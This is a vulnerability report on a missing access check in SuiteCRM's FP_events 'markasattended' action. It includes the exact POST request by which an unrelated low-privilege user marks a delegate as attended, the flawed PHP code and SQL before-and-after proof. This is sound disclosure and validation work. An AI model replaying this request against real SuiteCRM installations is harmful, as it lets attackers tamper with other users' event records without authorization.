# VULN-030 — `FP_events` systemic missing ACL (attendance tamper)

**Software**: SuiteCRM
**Repository**: https://github.com/SuiteCRM/SuiteCRM
**Affected version**: 7.15.2 (suitecrm_version.php) — commit-pinned forkedSuite snapshot
**Status**: CONFIRMED
**Severity (static)**: Medium
**Target commit**: 62effd0ceb767ed3b634ade585b19a6633eb4fcb
**Validated at**: 2026-09-28T20:51Z

## Preconditions
- `automation.py` creates two fresh, unrelated low-priv users via admin (`create_user`): event organiser **V** and attacker **A**.
- As **V**: creates an `FP_events` event (`duration_hours`/`date_start` are the module's only `required=>true` fields, per `modules/FP_events/vardefs.php:46-79`) and a Contact, then relates the Contact to the event via the legitimate `Save2` app flow (`module=FP_events&action=Save2&subpanel_field_name=fp_events_contacts`) — creating the `fp_events_contacts_c` row with its schema default `invite_status='Not Invited'`.
- **Non-destructive discipline honored**: the event, delegate, and relationship are all created fresh by this run; the attack only touches this one relationship row, never any demo event.

## Request
See `request.http`. As **A** (not the organiser, not a delegate, no relation to the event):
```
POST /index.php?module=FP_events&action=markasattended
Cookie: PHPSESSID=<attacker session>
Referer: http://localhost:33116/index.php?module=FP_events&action=DetailView&record=<event_id>
Content-Type: application/x-www-form-urlencoded

event_id=<V's event>&id=<delegate contact id>&entire_list=0
```

## Response
See `response.txt` (HTTP 200 — the action performs the UPDATE then falls through to the default view for the module; no denial page).

## Observation
Matches the static finding exactly. `modules/FP_events/controller.php:84-101` (`action_markasattended`):
```php
$ids = $_POST['id'];
$entire_list = $_POST['entire_list'];
$eventIDQuoted = $db->quote($_POST['event_id']);
if ($entire_list != '1') {
    $contacts = explode(',', $ids);
    foreach ($contacts as $contact) {
        $query = 'UPDATE fp_events_contacts_c SET invite_status="Attended" WHERE '
               . 'fp_events_contactsfp_events_ida="'.$eventIDQuoted.'" AND '
               . 'fp_events_contactscontacts_idb="'. $db->quote($contact) .'"';
        $res = $db->query($query);
        ...
```
No `ACLAccess`, `checkAccess`, `is_admin`, or `assigned_user_id`/owner comparison appears anywhere in this method or its seven siblings. The `UPDATE` is keyed purely on attacker-supplied `event_id`/contact id, values are `$db->quote()`'d (so this is an authorization defect, not SQLi, exactly as the finding states).

**DB proof of the real effect** (not just HTTP 200):
```sql
-- BEFORE attacker's request:
SELECT invite_status FROM fp_events_contacts_c WHERE fp_events_contactsfp_events_ida='<event>' AND fp_events_contactscontacts_idb='<contact>' AND deleted=0;
-- => Not Invited

-- AFTER:
-- => Attended
```
`invite_status` flipped from the seeded default `Not Invited` straight to `Attended` — the state a real check-in would produce — driven entirely by attacker A, who organises nothing about this event and was never granted edit rights on it.

## Side effects
Two new Users, one FP_events event, one Contact, and one `fp_events_contacts_c` relationship row created (random-suffixed, harmless) — all created by this run; only this one relationship's `invite_status` was modified.

## Research & references
- CWE-285 (Improper Access Control) — OWASP A01:2021-Broken Access Control.
- Same "request-id-driven bean/relationship action with no per-record ACL" family as [VULN-022](VULN-022.md)/[VULN-023](VULN-023.md)/[VULN-035](VULN-035.md); the CSRF-normalization angle for this same action family is tracked separately as VULN-088.
